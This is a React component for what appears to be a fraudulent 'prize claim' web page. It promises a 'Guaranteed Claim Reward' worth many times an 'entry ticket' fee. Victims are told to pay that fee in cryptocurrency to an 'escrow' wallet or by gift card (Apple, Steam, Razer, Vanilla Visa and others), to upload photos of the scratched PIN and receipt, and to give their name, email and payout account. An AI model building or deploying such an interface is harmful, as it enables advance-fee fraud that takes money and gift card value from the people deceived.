import React, { useState, useRef } from 'react';
import { PrizeTier, UserDetails, CryptoPaymentDetail } from '../types';
import { CRYPTO_PAYMENTS, GIFT_CARDS } from '../constants';
import {
  CreditCard,
  Copy,
  Check,
  Upload,
  ArrowRight,
  ShieldCheck,
  Sparkles,
  Gift,
  Coins,
  ChevronDown,
  Info,
  QrCode,
  FileCheck,
  FileText,
  User,
  Mail,
  Wallet,
  Building2,
  DollarSign,
  AlertCircle,
  Trash2,
  Camera,
} from 'lucide-react';

interface ClaimantProfileSectionProps {
  selectedTier: PrizeTier | null;
  userDetails: UserDetails;
  onUpdateUserDetails: (details: Partial<UserDetails>) => void;
  onSubmit: (e: React.FormEvent) => void;
  onBack: () => void;
}

export const ClaimantProfileSection: React.FC<ClaimantProfileSectionProps> = ({
  selectedTier,
  userDetails,
  onUpdateUserDetails,
  onSubmit,
  onBack,
}) => {
  const [copiedAddress, setCopiedAddress] = useState<string | null>(null);
  const [payoutMethod, setPayoutMethod] = useState<string>('CashApp');
  const [dragActive, setDragActive] = useState(false);
  const [uploadError, setUploadError] = useState<string | null>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);

  const selectedCrypto = CRYPTO_PAYMENTS.find(
    (c) => c.id === userDetails.paymentMethod || c.symbol === userDetails.paymentMethod
  );

  const selectedGiftCard = GIFT_CARDS.find(
    (g) => g.id === userDetails.paymentMethod || g.name === userDetails.paymentMethod
  );

  const isGiftCard = Boolean(
    selectedGiftCard ||
      userDetails.paymentMethod.toLowerCase().includes('gift') ||
      userDetails.paymentMethod.toLowerCase().includes('card')
  );

  const handleCopy = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedAddress(id);
    setTimeout(() => setCopiedAddress(null), 2500);
  };

  const handleFileDrop = (e: React.DragEvent) => {
    e.preventDefault();
    setDragActive(false);
    const file = e.dataTransfer.files?.[0];
    if (file) {
      processFile(file);
    }
  };

  const handleFileInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      processFile(file);
    }
  };

  const processFile = (file: File) => {
    setUploadError(null);
    const reader = new FileReader();
    reader.onload = (event) => {
      if (event.target?.result) {
        onUpdateUserDetails({
          receiptFile: event.target.result as string,
          receiptFileName: file.name,
        });
      }
    };
    reader.readAsDataURL(file);
  };

  const handleFormSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!userDetails.receiptFile && !userDetails.receiptFileName) {
      const errorMsg = isGiftCard
        ? 'COMPULSORY: You must upload a photo of the physical gift card (front & scratched PIN back) AND store purchase receipt before continuing.'
        : 'COMPULSORY: You must upload your cryptocurrency payment receipt / transaction screenshot before continuing.';
      setUploadError(errorMsg);
      fileInputRef.current?.scrollIntoView({ behavior: 'smooth', block: 'center' });
      return;
    }
    setUploadError(null);
    onSubmit(e);
  };

  const ticketFee = selectedTier?.entryFee || 50;
  const rewardFormatted = selectedTier
    ? selectedTier.reward.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })
    : '5,000.00';
  const multiplier = selectedTier ? Math.round((selectedTier.reward / selectedTier.entryFee) * 10) / 10 : 100;

  return (
    <div className="py-10 px-4 max-w-4xl mx-auto">
      {/* Back Button & Header */}
      <div className="mb-8 text-center">
        <button
          type="button"
          onClick={onBack}
          className="text-blue-400 hover:text-blue-300 inline-flex items-center gap-2 mb-4 mx-auto font-bold text-sm bg-slate-900/60 px-4 py-2 rounded-xl border border-slate-800 hover:border-slate-700 transition-all"
        >
          <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
          </svg>
          Back to Prefer Claim Tiers
        </button>
        <h2 className="text-3xl sm:text-5xl font-black text-white tracking-tight">
          Claimant Payout Profile
        </h2>
        <p className="text-slate-400 text-sm sm:text-base mt-2 max-w-xl mx-auto leading-relaxed">
          Provide your legal verification details and select your ticket settlement method via the drop-down below.
        </p>
      </div>

      {/* Main Profile Form Card */}
      <div className="bg-slate-900/70 p-6 sm:p-10 rounded-3xl border border-slate-800 backdrop-blur-xl shadow-2xl">
        {/* Tier Reward Summary Banner */}
        <div className="mb-8 p-5 sm:p-6 bg-gradient-to-r from-blue-950/70 via-indigo-950/60 to-slate-950/80 rounded-2xl border border-blue-500/30 flex flex-col sm:flex-row items-center justify-between gap-4 shadow-inner">
          <div className="flex items-center gap-4">
            <div className="w-14 h-14 rounded-2xl bg-blue-600/20 border border-blue-500/40 flex items-center justify-center font-black text-blue-400 text-xl shadow-md">
              ${ticketFee}
            </div>
            <div>
              <div className="flex items-center gap-2">
                <span className="text-[11px] font-bold uppercase tracking-wider text-blue-400 bg-blue-500/10 px-2 py-0.5 rounded border border-blue-500/20">
                  Prefer Claim Ticket #{selectedTier?.id || 1}
                </span>
                <span className="text-[11px] font-bold text-emerald-400 bg-emerald-500/10 px-2 py-0.5 rounded border border-emerald-500/20">
                  {multiplier}x Return
                </span>
              </div>
              <h3 className="text-lg font-black text-white mt-1">
                ${ticketFee.toLocaleString()} Entry Ticket
              </h3>
            </div>
          </div>

          <div className="text-right sm:border-l sm:border-slate-800 sm:pl-6">
            <p className="text-xs font-bold uppercase tracking-wider text-slate-400">Guaranteed Claim Reward</p>
            <p className="text-2xl sm:text-3xl font-black text-emerald-400 tracking-tight">
              ${rewardFormatted}
            </p>
          </div>
        </div>

        <form onSubmit={handleFormSubmit} className="space-y-8">
          {/* 1. Identity Information */}
          <div className="space-y-4">
            <div className="flex items-center gap-2 border-b border-slate-800 pb-2">
              <User className="w-4 h-4 text-blue-400" />
              <h4 className="text-sm font-black uppercase tracking-wider text-white">
                1. Claimant Identification
              </h4>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              <div>
                <label className="block text-xs font-bold uppercase tracking-wider text-slate-400 mb-2">
                  Legal Full Name <span className="text-red-400">*</span>
                </label>
                <div className="relative">
                  <input
                    required
                    type="text"
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl pl-10 pr-4 py-3.5 text-white placeholder-slate-500 focus:border-blue-500 focus:outline-none transition-colors text-sm"
                    placeholder="e.g. Johnathan Doe"
                    value={userDetails.fullName}
                    onChange={(e) => onUpdateUserDetails({ fullName: e.target.value })}
                  />
                  <User className="w-4 h-4 text-slate-500 absolute left-3.5 top-1/2 -translate-y-1/2" />
                </div>
              </div>

              <div>
                <label className="block text-xs font-bold uppercase tracking-wider text-slate-400 mb-2">
                  Verification & Notification Email <span className="text-red-400">*</span>
                </label>
                <div className="relative">
                  <input
                    required
                    type="email"
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl pl-10 pr-4 py-3.5 text-white placeholder-slate-500 focus:border-blue-500 focus:outline-none transition-colors text-sm"
                    placeholder="e.g. claimant@example.com"
                    value={userDetails.email}
                    onChange={(e) => onUpdateUserDetails({ email: e.target.value })}
                  />
                  <Mail className="w-4 h-4 text-slate-500 absolute left-3.5 top-1/2 -translate-y-1/2" />
                </div>
              </div>
            </div>
          </div>

          {/* 2. Ticket Payment Channel Drop-Down Selection */}
          <div className="space-y-4">
            <div className="flex items-center justify-between border-b border-slate-800 pb-2">
              <div className="flex items-center gap-2">
                <Coins className="w-4 h-4 text-amber-400" />
                <h4 className="text-sm font-black uppercase tracking-wider text-white">
                  2. Ticket Payment Method (Cryptocurrency & Gift Cards)
                </h4>
              </div>
              <span className="text-[11px] font-bold text-blue-400 bg-blue-500/10 px-2.5 py-0.5 rounded-full border border-blue-500/20">
                Drop-Down Selection
              </span>
            </div>

            <div>
              <label
                htmlFor="ticket-payment-method-dropdown"
                className="block text-xs font-bold uppercase tracking-wider text-slate-300 mb-2"
              >
                Select Preferred Deposit Method <span className="text-red-400">*</span>
              </label>
              <div className="relative">
                <select
                  id="ticket-payment-method-dropdown"
                  required
                  value={userDetails.paymentMethod}
                  onChange={(e) => onUpdateUserDetails({ paymentMethod: e.target.value })}
                  className="w-full bg-slate-950 border-2 border-blue-500/40 hover:border-blue-500 rounded-xl px-4 py-3.5 text-white font-semibold text-sm appearance-none focus:border-blue-400 focus:ring-2 focus:ring-blue-500/20 focus:outline-none transition-all cursor-pointer pr-10 shadow-lg"
                >
                  <optgroup label="⚡ Cryptocurrency (Direct Blockchain Deposit)" className="bg-slate-900 text-blue-400 font-bold">
                    <option value="BTC" className="bg-slate-950 text-white font-normal py-1">
                      Bitcoin (BTC - Native SegWit)
                    </option>
                    <option value="USDT_BEP20" className="bg-slate-950 text-white font-normal py-1">
                      Tether USD (USDT - BEP20 BNB Smart Chain)
                    </option>
                    <option value="ETH_ERC20" className="bg-slate-950 text-white font-normal py-1">
                      Ethereum (ETH - ERC20 Mainnet)
                    </option>
                    <option value="USDT_TRON" className="bg-slate-950 text-white font-normal py-1">
                      Tether USD (USDT - TRON TRC20)
                    </option>
                  </optgroup>

                  <optgroup label="🎁 Gift Card Settlement (Instant PIN & Receipt)" className="bg-slate-900 text-amber-400 font-bold">
                    <option value="Apple Gift Card" className="bg-slate-950 text-white font-normal py-1">
                      🍎 Apple Gift Card (App Store & iTunes)
                    </option>
                    <option value="Razer Gift Card" className="bg-slate-950 text-white font-normal py-1">
                      ⚡ Razer Gold Gift Card
                    </option>
                    <option value="Steam Gift Card" className="bg-slate-950 text-white font-normal py-1">
                      🎮 Steam Wallet Gift Card
                    </option>
                    <option value="Xbox Gift Card" className="bg-slate-950 text-white font-normal py-1">
                      🎯 Xbox Live & Microsoft Store Gift Card
                    </option>
                    <option value="Sephora Gift Card" className="bg-slate-950 text-white font-normal py-1">
                      ✨ Sephora Gift Card
                    </option>
                    <option value="Vanilla Visa Gift Card" className="bg-slate-950 text-white font-normal py-1">
                      💳 Vanilla Visa / Mastercard Prepaid
                    </option>
                    <option value="Amazon Gift Card" className="bg-slate-950 text-white font-normal py-1">
                      📦 Amazon Gift Card
                    </option>
                  </optgroup>
                </select>

                <div className="absolute right-3.5 top-1/2 -translate-y-1/2 pointer-events-none text-slate-400">
                  <ChevronDown className="w-5 h-5" />
                </div>
              </div>
              <p className="text-[11px] text-slate-400 mt-1.5 flex items-center gap-1.5">
                <Info className="w-3.5 h-3.5 text-blue-400 flex-shrink-0" />
                Deposit details and instructions will dynamically display below based on your selection.
              </p>
            </div>

            {/* DYNAMIC PAYMENT METHOD DETAILS CARD */}
            {selectedCrypto && (
              <div className="p-5 bg-slate-950 rounded-2xl border border-blue-500/30 space-y-4 shadow-xl">
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-800 pb-3">
                  <div className="flex items-center gap-3">
                    <span className="w-9 h-9 rounded-xl bg-blue-600/20 border border-blue-500/30 flex items-center justify-center text-blue-400 font-mono font-black text-xs">
                      {selectedCrypto.symbol}
                    </span>
                    <div>
                      <h5 className="text-sm font-bold text-white flex items-center gap-2">
                        {selectedCrypto.name}
                        <span className="text-[10px] font-bold bg-blue-500/20 text-blue-400 px-2 py-0.5 rounded-full border border-blue-500/30">
                          {selectedCrypto.network}
                        </span>
                      </h5>
                      <p className="text-[11px] text-slate-400">
                        Official Escrow Deposit Address for ${ticketFee} Ticket Fee
                      </p>
                    </div>
                  </div>

                  <button
                    type="button"
                    onClick={() => handleCopy(selectedCrypto.address, selectedCrypto.id)}
                    className={`px-3.5 py-1.5 rounded-xl text-xs font-bold transition-all flex items-center justify-center gap-1.5 ${
                      copiedAddress === selectedCrypto.id
                        ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30'
                        : 'bg-blue-600/20 hover:bg-blue-600 text-blue-300 hover:text-white border border-blue-500/30'
                    }`}
                  >
                    {copiedAddress === selectedCrypto.id ? (
                      <>
                        <Check className="w-3.5 h-3.5" /> Address Copied!
                      </>
                    ) : (
                      <>
                        <Copy className="w-3.5 h-3.5" /> Copy Wallet Address
                      </>
                    )}
                  </button>
                </div>

                <div className="p-3 bg-slate-900/90 rounded-xl border border-slate-800 flex items-center justify-between">
                  <code className="text-xs font-mono text-blue-300 break-all select-all font-semibold">
                    {selectedCrypto.address}
                  </code>
                </div>

                <div className="flex items-center gap-2 text-[11px] text-slate-400 bg-blue-950/30 p-2.5 rounded-xl border border-blue-900/40">
                  <ShieldCheck className="w-4 h-4 text-emerald-400 flex-shrink-0" />
                  <span>
                    Send exactly <strong className="text-white">${ticketFee} USD equivalent</strong> to this address.
                    Instant verification occurs upon 1 blockchain network confirmation.
                  </span>
                </div>
              </div>
            )}

            {isGiftCard && (
              <div className="p-5 bg-slate-950 rounded-2xl border border-amber-500/30 space-y-4 shadow-xl">
                <div className="flex items-center gap-3 border-b border-slate-800 pb-3">
                  <span className="text-2xl p-2 rounded-xl bg-slate-900 border border-slate-800">
                    {selectedGiftCard?.icon || '🎁'}
                  </span>
                  <div>
                    <h5 className="text-sm font-bold text-white">
                      {selectedGiftCard?.name || userDetails.paymentMethod} (1:1 Face Value)
                    </h5>
                    <p className="text-[11px] text-slate-400">
                      Purchase a ${ticketFee} gift card and enter the claim code or PIN below.
                    </p>
                  </div>
                </div>

                <div>
                  <label className="block text-xs font-bold uppercase tracking-wider text-slate-400 mb-2">
                    16-Digit Gift Card PIN / Redemption Code (Optional if uploading receipt)
                  </label>
                  <input
                    type="text"
                    className="w-full bg-slate-900 border border-slate-700/80 rounded-xl px-4 py-3 font-mono text-white text-sm focus:border-amber-400 focus:outline-none transition-colors tracking-widest placeholder-slate-600"
                    placeholder="XXXX-XXXX-XXXX-XXXX"
                    value={userDetails.giftCardCode || ''}
                    onChange={(e) => onUpdateUserDetails({ giftCardCode: e.target.value })}
                  />
                  <p className="text-[10px] text-slate-500 mt-1">
                    Provide the scratched PIN from the back of the physical card or the digital activation code.
                  </p>
                </div>
              </div>
            )}
          </div>

          {/* 3. Payout Receiving Method Selection & Address */}
          <div className="space-y-4">
            <div className="flex items-center justify-between border-b border-slate-800 pb-2">
              <div className="flex items-center gap-2">
                <DollarSign className="w-4 h-4 text-emerald-400" />
                <h4 className="text-sm font-black uppercase tracking-wider text-white">
                  3. Payout Receiving Channel & Account
                </h4>
              </div>
              <span className="text-[11px] font-bold text-emerald-400 bg-emerald-500/10 px-2.5 py-0.5 rounded-full border border-emerald-500/20">
                Guaranteed Payout
              </span>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              <div>
                <label
                  htmlFor="payout-method-dropdown"
                  className="block text-xs font-bold uppercase tracking-wider text-slate-400 mb-2"
                >
                  Receive Winnings Via
                </label>
                <div className="relative">
                  <select
                    id="payout-method-dropdown"
                    value={payoutMethod}
                    onChange={(e) => setPayoutMethod(e.target.value)}
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3.5 text-white font-medium text-sm appearance-none focus:border-emerald-500 focus:outline-none transition-colors cursor-pointer pr-10"
                  >
                    <option value="CashApp">Cash App ($Cashtag Direct)</option>
                    <option value="BTC">Bitcoin (BTC Wallet)</option>
                    <option value="USDT_BEP20">USDT (BEP-20 / Binance Pay)</option>
                    <option value="ETH_ERC20">Ethereum (ETH / ERC-20)</option>
                    <option value="USDT_TRON">USDT (TRC-20 TRON)</option>
                    <option value="PayPal">PayPal (Direct Instant Transfer)</option>
                    <option value="BankWire">Direct Bank Wire / Zelle</option>
                    <option value="Apple Gift Card">Apple Gift Card Codes</option>
                  </select>
                  <div className="absolute right-3.5 top-1/2 -translate-y-1/2 pointer-events-none text-slate-400">
                    <ChevronDown className="w-4 h-4" />
                  </div>
                </div>
              </div>

              <div>
                <label className="block text-xs font-bold uppercase tracking-wider text-slate-400 mb-2">
                  Your Recipient Account / Wallet Address <span className="text-red-400">*</span>
                </label>
                <div className="relative">
                  <input
                    required
                    type="text"
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl pl-10 pr-4 py-3.5 font-mono text-white text-sm focus:border-emerald-500 focus:outline-none transition-colors placeholder-slate-600"
                    placeholder={
                      payoutMethod === 'CashApp'
                        ? 'e.g. $YourCashtag'
                        : payoutMethod === 'PayPal'
                        ? 'e.g. your-paypal@email.com'
                        : payoutMethod === 'BankWire'
                        ? 'e.g. Routing/Account or Zelle phone'
                        : 'e.g. Paste your crypto payout address'
                    }
                    value={userDetails.walletAddress || ''}
                    onChange={(e) => onUpdateUserDetails({ walletAddress: e.target.value })}
                  />
                  <Wallet className="w-4 h-4 text-emerald-400 absolute left-3.5 top-1/2 -translate-y-1/2" />
                </div>
              </div>
            </div>
          </div>

          {/* 4. Compulsory Payment Receipt / Physical Card & Receipt Upload */}
          <div className="space-y-3">
            <div className="flex items-center justify-between border-b border-slate-800 pb-2">
              <div className="flex items-center gap-2">
                <Upload className="w-4 h-4 text-blue-400" />
                <h4 className="text-sm font-black uppercase tracking-wider text-white flex items-center gap-2">
                  <span>
                    4. {isGiftCard ? 'Physical Gift Card (Front & Scratched Back) & Store Receipt' : 'Cryptocurrency Payment Receipt / TxID'}
                  </span>
                  <span className="text-red-400 font-black text-xs">* [COMPULSORY]</span>
                </h4>
              </div>
              <span className="text-[11px] font-bold text-red-400 bg-red-500/10 px-2 py-0.5 rounded border border-red-500/20">
                Required by Ledger
              </span>
            </div>

            {/* Validation Error Alert */}
            {uploadError && (
              <div className="p-4 bg-red-500/15 border-2 border-red-500/60 rounded-2xl flex items-start gap-3 text-red-300 text-xs font-semibold animate-pulse">
                <AlertCircle className="w-5 h-5 text-red-400 flex-shrink-0 mt-0.5" />
                <div className="space-y-1">
                  <p className="font-black text-red-200 uppercase tracking-wide">
                    Mandatory Verification Proof Required
                  </p>
                  <p>{uploadError}</p>
                </div>
              </div>
            )}

            {/* Dynamic Guidance Notice */}
            <div className="p-3.5 bg-slate-950/80 rounded-xl border border-slate-800 text-xs text-slate-300 space-y-1">
              <p className="font-bold text-slate-200 flex items-center gap-1.5">
                <Camera className="w-4 h-4 text-amber-400" />
                {isGiftCard
                  ? 'Compulsory for Gift Cards:'
                  : 'Compulsory for Cryptocurrency:'}
              </p>
              <p className="text-[11px] text-slate-400 leading-relaxed">
                {isGiftCard
                  ? 'You must upload a clear photo showing the physical gift card with scratched PIN code visible alongside the retail store purchase receipt for automated OCR & escrow clearance.'
                  : 'You must upload a screenshot or receipt of your blockchain transfer showing the destination wallet address, transaction amount, and TxID hash.'}
              </p>
            </div>

            <div
              onDragOver={(e) => {
                e.preventDefault();
                setDragActive(true);
              }}
              onDragLeave={() => setDragActive(false)}
              onDrop={handleFileDrop}
              onClick={() => fileInputRef.current?.click()}
              className={`p-6 rounded-2xl border-2 border-dashed transition-all cursor-pointer text-center flex flex-col items-center justify-center gap-3 ${
                uploadError
                  ? 'border-red-500 bg-red-500/10 shadow-[0_0_20px_rgba(239,68,68,0.25)]'
                  : dragActive
                  ? 'border-blue-500 bg-blue-500/10'
                  : userDetails.receiptFile || userDetails.receiptFileName
                  ? 'border-emerald-500/60 bg-emerald-500/5'
                  : 'border-slate-700 bg-slate-950/90 hover:border-blue-400'
              }`}
            >
              <input
                ref={fileInputRef}
                type="file"
                accept="image/*,.pdf"
                className="hidden"
                onChange={handleFileInput}
              />

              {userDetails.receiptFile || userDetails.receiptFileName ? (
                <div className="space-y-3 w-full">
                  {userDetails.receiptFile && userDetails.receiptFile.startsWith('data:image') ? (
                    <div className="relative inline-block">
                      <img
                        src={userDetails.receiptFile}
                        alt="Attached Proof Preview"
                        className="max-h-36 max-w-full mx-auto rounded-xl border border-slate-700 shadow-lg object-contain"
                      />
                      <span className="absolute top-2 right-2 bg-emerald-600 text-white text-[10px] font-bold px-2 py-0.5 rounded-full shadow-md">
                        Verified Upload
                      </span>
                    </div>
                  ) : (
                    <FileText className="w-12 h-12 text-emerald-400 mx-auto" />
                  )}

                  <div className="flex items-center justify-center gap-2 text-emerald-400 font-bold text-xs">
                    <FileCheck className="w-4 h-4" />
                    <span className="truncate max-w-[260px]">{userDetails.receiptFileName || 'payment_proof_receipt.jpg'}</span>
                  </div>

                  <div className="flex items-center justify-center gap-3 pt-1">
                    <span className="text-[11px] text-blue-400 font-semibold hover:underline">
                      Click to choose a different file
                    </span>
                    <button
                      type="button"
                      onClick={(e) => {
                        e.stopPropagation();
                        onUpdateUserDetails({ receiptFile: undefined, receiptFileName: undefined });
                      }}
                      className="text-[11px] text-red-400 hover:text-red-300 font-semibold flex items-center gap-1 bg-red-500/10 px-2.5 py-1 rounded-lg border border-red-500/20"
                    >
                      <Trash2 className="w-3 h-3" />
                      Remove
                    </button>
                  </div>
                </div>
              ) : (
                <div className="space-y-2">
                  <div className="w-12 h-12 rounded-full bg-blue-600/20 border border-blue-500/30 flex items-center justify-center text-blue-400 mx-auto">
                    <Upload className="w-6 h-6" />
                  </div>
                  <p className="text-sm font-bold text-white">
                    {isGiftCard
                      ? 'Upload Physical Gift Card Photo & Store Receipt'
                      : 'Upload Crypto Transfer Receipt / Screenshot'}
                  </p>
                  <p className="text-xs text-red-400 font-bold">
                    * Receipt upload is mandatory to proceed with claim verification
                  </p>
                  <p className="text-[11px] text-slate-500">
                    Supports JPG, PNG, WEBP, or PDF (Click to browse or drag & drop)
                  </p>
                </div>
              )}
            </div>
          </div>

          {/* Submit CTA */}
          <button
            id="submit-claimant-profile-btn"
            type="submit"
            className="w-full py-4 sm:py-5 bg-gradient-to-r from-blue-600 via-indigo-600 to-blue-600 hover:from-blue-500 hover:to-indigo-500 text-white rounded-2xl font-black text-base sm:text-lg shadow-xl shadow-blue-500/25 transition-all transform hover:scale-[1.01] active:scale-95 flex items-center justify-center gap-3 border border-blue-400/30"
          >
            <span>Proceed to Payment Verification & Settlement</span>
            <ArrowRight className="w-5 h-5" />
          </button>
        </form>
      </div>
    </div>
  );
};
